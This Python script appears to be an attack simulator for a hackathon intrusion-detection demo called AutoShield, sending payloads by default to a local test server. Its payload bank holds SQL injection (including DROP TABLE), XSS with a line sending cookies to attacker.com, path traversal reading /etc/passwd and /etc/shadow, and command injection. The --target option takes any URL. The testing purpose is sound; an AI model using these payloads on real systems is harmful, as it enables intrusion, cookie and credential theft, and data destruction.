"""
AutoShield - Attack Simulator
Fires real HTTP requests with malicious payloads to a target server.
Use against YOUR OWN local test server ONLY.
Default target: http://localhost:8080 (spin up with: python -m http.server 8080)
"""

import requests
import time
import argparse
import sys
from urllib.parse import quote

TARGET = "http://localhost:8080"

# ─── Payload Bank ─────────────────────────────────────────────────────────────

PAYLOADS = {
    "SQLi": [
        "/login?user=' OR '1'='1'--&pass=anything",
        "/products?id=1 UNION SELECT username,password FROM users--",
        "/search?q=1' AND SLEEP(5)--",
        "/api/user?id=1; DROP TABLE sessions--",
    ],
    "XSS": [
        "/search?q=<script>alert(document.cookie)</script>",
        "/profile?name=<img src=x onerror=alert('XSS')>",
        '/comment?text=<svg onload=fetch("https://attacker.com/?c="+document.cookie)>',
        "/page?title=<iframe src=javascript:alert('xss')>",
    ],
    "LFI": [
        "/page?file=../../../../etc/passwd",
        "/download?path=../../../etc/shadow",
        "/view?template=php://filter/convert.base64-encode/resource=/etc/passwd",
        "/load?module=../../../../proc/self/environ",
    ],
    "CMDi": [
        "/ping?host=8.8.8.8;cat /etc/passwd",
        "/lookup?domain=google.com|id",
        "/exec?cmd=ls -la;whoami",
        "/check?url=http://x.com`id`",
    ],
}

SEVERITY = {
    "SQLi": "CRITICAL",
    "XSS":  "HIGH",
    "LFI":  "CRITICAL",
    "CMDi": "CRITICAL",
}

COLORS = {
    "CRITICAL": "\033[91m",   # red
    "HIGH":     "\033[93m",   # yellow
    "INFO":     "\033[94m",   # blue
    "GREEN":    "\033[92m",
    "RESET":    "\033[0m",
    "BOLD":     "\033[1m",
}

def c(text, color): return f"{COLORS[color]}{text}{COLORS['RESET']}"


# ─── Simulator ────────────────────────────────────────────────────────────────

def fire_attack(attack_type: str, target: str = TARGET,
                delay: float = 0.5, verbose: bool = True):
    """Fire all payloads for given attack type."""
    payloads = PAYLOADS.get(attack_type, [])
    results  = []

    sev = SEVERITY.get(attack_type, "HIGH")
    print(f"\n{c('━'*50, 'BOLD')}")
    print(f"{c(f'  [{sev}] Launching {attack_type} attack', sev)}")
    print(f"{c('━'*50, 'BOLD')}")

    for payload in payloads:
        url = target.rstrip("/") + payload
        try:
            resp = requests.get(url, timeout=3, allow_redirects=False)
            status = resp.status_code
        except requests.exceptions.ConnectionError:
            status = "CONNECTION_REFUSED"
        except requests.exceptions.Timeout:
            status = "TIMEOUT"
        except Exception as e:
            status = f"ERROR:{e}"

        result = {
            "type":    attack_type,
            "payload": payload,
            "status":  status,
        }
        results.append(result)

        if verbose:
            print(f"  {c('→', 'INFO')} {payload[:60]}...")
            print(f"    HTTP {status}")

        time.sleep(delay)

    return results


def run_full_demo(target: str = TARGET, delay: float = 1.0):
    """
    Full demo sequence — fires all 4 attack types with pauses.
    This is your 3-minute hackathon demo.
    """
    print(f"\n{c('='*60, 'BOLD')}")
    print(f"{c('  🛡️  AutoShield Attack Simulator — DEMO MODE', 'BOLD')}")
    print(f"{c('='*60, 'BOLD')}")
    print(f"\n  {c('Target:', 'INFO')} {target}")
    print(f"  {c('⚠️  Only use against systems you own!', 'CRITICAL')}\n")

    all_results = {}
    for atype in ["SQLi", "XSS", "LFI", "CMDi"]:
        all_results[atype] = fire_attack(atype, target, delay=delay)
        time.sleep(delay * 2)

    print(f"\n{c('='*60, 'BOLD')}")
    print(f"{c('  Demo complete. Check AutoShield dashboard.', 'GREEN')}")
    print(f"{c('='*60, 'BOLD')}\n")
    return all_results


def run_single_attack(attack_type: str, target: str = TARGET):
    """Fire single attack type — for live dashboard demo."""
    if attack_type not in PAYLOADS:
        print(f"Unknown attack type: {attack_type}")
        print(f"Choose from: {list(PAYLOADS.keys())}")
        sys.exit(1)
    fire_attack(attack_type, target)


# ─── CLI ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="AutoShield Attack Simulator — for demo/testing only"
    )
    parser.add_argument(
        "--target", default=TARGET,
        help=f"Target URL (default: {TARGET})"
    )
    parser.add_argument(
        "--type", choices=["SQLi", "XSS", "LFI", "CMDi", "all"],
        default="all", help="Attack type to simulate"
    )
    parser.add_argument(
        "--delay", type=float, default=0.5,
        help="Delay between payloads in seconds"
    )
    args = parser.parse_args()

    if args.type == "all":
        run_full_demo(target=args.target, delay=args.delay)
    else:
        run_single_attack(args.type, target=args.target)
